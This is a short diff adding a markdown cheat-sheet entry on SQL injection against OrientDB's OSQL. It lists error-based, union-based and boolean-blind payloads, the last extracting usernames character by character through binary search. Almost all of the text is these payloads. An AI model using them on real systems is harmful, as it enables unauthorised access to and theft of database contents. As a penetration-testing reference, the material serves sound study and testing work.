@@ -1,0 +1,19 @@
+# OrientDB
+
+OrientDB uses OSQL, similar to SQL with graph elements.
+
+## Error-based
+' OR 1/0 -- to cause division error.
+
+## Union query-based
+Limited; ' UNION SELECT * FROM User -- to append.
+
+## Boolean-based blind
+' OR LENGTH(username)>16 --
+
+Binary search.
+
+' OR ASCII(SUBSTR(username,1,1))>109 --
+
+Etc. for chars.
+
